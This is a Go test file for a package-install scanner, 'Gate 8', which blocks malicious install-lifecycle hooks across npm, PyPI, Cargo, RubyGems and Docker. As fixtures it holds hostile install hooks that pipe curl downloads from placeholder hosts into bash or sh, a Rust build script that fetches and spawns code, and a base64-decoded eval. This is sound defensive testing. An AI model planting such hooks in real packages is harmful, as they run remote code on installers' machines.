package gate

import (
	"context"
	"errors"
	"path/filepath"
	"strings"
	"testing"
	"testing/quick"
	"time"

	"github.com/penrush/penrush/internal/override"
)

// stubScanner drives Gate 8 with crafted payload contents (or an error) —
// deterministic, zero network (arch delta §V7 recorded-fixture discipline).
type stubScanner struct {
	contents map[string][]byte
	err      error
	calls    int
}

func (s *stubScanner) Scan(_ context.Context, _, _, _ string) (map[string][]byte, error) {
	s.calls++
	if s.err != nil {
		return nil, s.err
	}
	return s.contents, nil
}

func newGate8(sc PayloadScanner) *Gate8 {
	return &Gate8{Engine: &Engine{Now: func() time.Time { return time.Unix(1_800_000_000, 0) }}, Scanner: sc}
}

// --- FR-106 §5.7 acceptance criteria (all 8) ---

func TestGate8_AC_NPM_PostinstallFetchExec_HighBlock(t *testing.T) {
	g := newGate8(&stubScanner{contents: map[string][]byte{
		"package/package.json": []byte(`{"name":"p","scripts":{"postinstall":"curl https://x.example/p.sh | bash"}}`),
	}})
	v := g.Check(context.Background(), "npm", "p", "1.0.0", false)
	if v.Decision != Block {
		t.Fatalf("AC1 npm postinstall curl|bash → want Block, got %s (%s)", v.Decision, v.Reason)
	}
	if !strings.Contains(v.Reason, "remote code") || !strings.Contains(v.Reason, "override") {
		t.Errorf("AC1 reason missing HIGH wording / override path: %q", v.Reason)
	}
}

func TestGate8_AC_PyPI_SetupURLOpenOsSystem_HighBlock(t *testing.T) {
	g := newGate8(&stubScanner{contents: map[string][]byte{
		"p-1.0/setup.py": []byte("import urllib.request, os\nurllib.request.urlopen('http://x')\nos.system('sh e')"),
	}})
	v := g.Check(context.Background(), "pypi", "p", "1.0", false)
	if v.Decision != Block {
		t.Fatalf("AC2 pypi urlopen+os.system → want Block, got %s (%s)", v.Decision, v.Reason)
	}
}

func TestGate8_AC_Benign_NodeGyp_MediumAdvisoryPasses(t *testing.T) {
	g := newGate8(&stubScanner{contents: map[string][]byte{
		"package/package.json": []byte(`{"name":"p","scripts":{"install":"node-gyp rebuild"}}`),
	}})
	v := g.Check(context.Background(), "npm", "p", "1.0.0", false)
	if v.Decision != Pass {
		t.Fatalf("AC3 benign node-gyp → want Pass (advisory), got %s (%s)", v.Decision, v.Reason)
	}
	if !strings.Contains(v.Reason, "install-lifecycle hook") {
		t.Errorf("AC3 should record install-script-present advisory: %q", v.Reason)
	}
}

func TestGate8_AC_Cargo_BuildRsFetchExec_HighBlock(t *testing.T) {
	g := newGate8(&stubScanner{contents: map[string][]byte{
		"p-1.0/build.rs": []byte(`let b=reqwest::blocking::get("http://x").unwrap(); std::process::Command::new("sh").arg(b).spawn();`),
	}})
	v := g.Check(context.Background(), "cargo", "p", "1.0", false)
	if v.Decision != Block {
		t.Fatalf("AC4 cargo build.rs fetch+exec → want Block, got %s (%s)", v.Decision, v.Reason)
	}
}

func TestGate8_AC_Gem_ExtconfShellout_HighBlock(t *testing.T) {
	g := newGate8(&stubScanner{contents: map[string][]byte{
		"ext/p/extconf.rb": []byte("system(`curl http://x/e | bash`)"),
	}})
	v := g.Check(context.Background(), "gem", "p", "1.0", false)
	if v.Decision != Block {
		t.Fatalf("AC5 gem extconf shellout → want Block, got %s (%s)", v.Decision, v.Reason)
	}
}

func TestGate8_AC_Docker_RunCurlSh_HighBlock(t *testing.T) {
	g := newGate8(&stubScanner{contents: map[string][]byte{
		"image-config.json": []byte(`{"history":[{"created_by":"RUN /bin/sh -c curl -fsSL http://x/i | sh"}]}`),
	}})
	v := g.Check(context.Background(), "docker", "library/p", "1.0", false)
	if v.Decision != Block {
		t.Fatalf("AC6 docker RUN curl|sh → want Block, got %s (%s)", v.Decision, v.Reason)
	}
}

func TestGate8_AC_Go_IsNA_NeverBlocks(t *testing.T) {
	g := newGate8(&stubScanner{err: errors.New("should not be called")})
	v := g.Check(context.Background(), "go", "golang.org/x/tools", "v0.1.0", false)
	if v.Decision != Pass || !strings.Contains(v.Reason, "n/a") {
		t.Fatalf("AC7 go → want Pass n/a, got %s (%s)", v.Decision, v.Reason)
	}
	// The scanner must not even be consulted for Go (no payload fetch).
	if sc := g.Scanner.(*stubScanner); sc.calls != 0 {
		t.Errorf("AC7 Go must not fetch a payload; scanner called %d times", sc.calls)
	}
}

func TestGate8_AC_Unparseable_FailClosedBlock(t *testing.T) {
	g := newGate8(&stubScanner{contents: map[string][]byte{
		"package/package.json": []byte(`{"name":"p","scripts":{"postinstall":"eval \"$(echo Zm9v | base64 -d)\""}}`),
	}})
	v := g.Check(context.Background(), "npm", "p", "1.0", false)
	if v.Decision != Block {
		t.Fatalf("AC8 unparseable/indirected → want fail-closed Block, got %s (%s)", v.Decision, v.Reason)
	}
	if !strings.Contains(v.Reason, "fully resolve") && !strings.Contains(v.Reason, "unparseable") {
		t.Errorf("AC8 reason should state unparseable/fail-closed: %q", v.Reason)
	}
}

// --- orchestration behaviors ---

func TestGate8_ShortCircuit_NoPayloadFetchWhenPriorBlocked(t *testing.T) {
	sc := &stubScanner{err: errors.New("scanner must not be called")}
	g := newGate8(sc)
	v := g.Check(context.Background(), "npm", "p", "0.0.1", true) // priorBlocked
	if v.Decision != Pass || sc.calls != 0 {
		t.Fatalf("short-circuit failed: decision=%s calls=%d (§V1.2 — no payload fetch)", v.Decision, sc.calls)
	}
}

func TestGate8_FetchError_FailsClosed(t *testing.T) {
	g := newGate8(&stubScanner{err: errors.New("decompression bomb")})
	v := g.Check(context.Background(), "npm", "p", "1.0", false)
	if v.Decision != Block {
		t.Fatalf("scanner error must fail closed, got %s", v.Decision)
	}
	if !strings.Contains(v.Reason, "fail-closed") {
		t.Errorf("reason should say fail-closed: %q", v.Reason)
	}
}

func TestGate8_OverrideWaives(t *testing.T) {
	dir := t.TempDir()
	store, err := override.Load(filepath.Join(dir, "overrides.json"))
	if err != nil {
		t.Fatal(err)
	}
	now := time.Unix(1_800_000_000, 0)
	if _, err := store.Add("npm:p", "reviewed by security", 24*time.Hour, now); err != nil {
		t.Fatal(err)
	}
	g := &Gate8{
		Engine:  &Engine{Overrides: store, Now: func() time.Time { return now }},
		Scanner: &stubScanner{err: errors.New("scanner must not be called under override")},
	}
	v := g.Check(context.Background(), "npm", "p", "", false)
	if v.Decision != OverrideUsed {
		t.Fatalf("override should waive Gate 8, got %s (%s)", v.Decision, v.Reason)
	}
}

// --- no-execution invariant + robustness property ---

// TestProperty_Gate8NeverPanicsNeverExecutes: over arbitrary hook bytes and any
// ecosystem, Check returns a Verdict without panic, and Go NEVER blocks. The
// gate only reads bytes — there is no code path that executes payload content
// (delta §V4.9). The stub records that Scan is a pure data return; nothing in
// the pipeline runs the contents.
func TestProperty_Gate8NeverPanicsNeverExecutes(t *testing.T) {
	ecos := []string{"npm", "pypi", "cargo", "gem", "docker", "go", "github", "mcp"}
	f := func(body string, ecoIdx uint8) bool {
		eco := ecos[int(ecoIdx)%len(ecos)]
		g := newGate8(&stubScanner{contents: map[string][]byte{
			"package/package.json": []byte(body),
			"setup.py":             []byte(body),
			"build.rs":             []byte(body),
			"ext/x/extconf.rb":     []byte(body),
			"image-config.json":    []byte(body),
		}})
		v := g.Check(context.Background(), eco, "p", "1.0", false)
		if eco == "go" && v.Decision == Block {
			return false // Go must never false-block
		}
		return v.Gate == "G8"
	}
	if err := quick.Check(f, &quick.Config{MaxCount: 2000}); err != nil {
		t.Fatal(err)
	}
}
